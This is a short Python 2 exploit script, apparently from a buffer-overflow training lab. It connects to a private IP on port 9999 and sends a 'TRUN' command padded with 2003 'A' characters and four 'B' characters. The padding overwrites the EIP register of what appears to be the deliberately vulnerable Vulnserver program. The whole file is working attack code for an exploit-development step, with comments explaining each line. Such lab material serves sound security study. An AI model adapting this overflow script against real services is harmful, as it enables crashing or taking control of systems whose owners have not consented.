#!/usr/bin/python
 
import sys, socket                                                       # import modules to call ip and port

shellcode= "A" * 2003 + "B" * 4                                          # shellcode will be sent to overflow. A's will be sent until the EIP begins

  
try:
         
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            # connect socket to ip and port
        s.connect(('192.168.1.12',9999))
         
        s.send(('TRUN /.:/' + shellcode))                                # payload sent
        s.close()                                                        # socket closed
        
except:
        print "error connecting to server"    
        sys.exit()
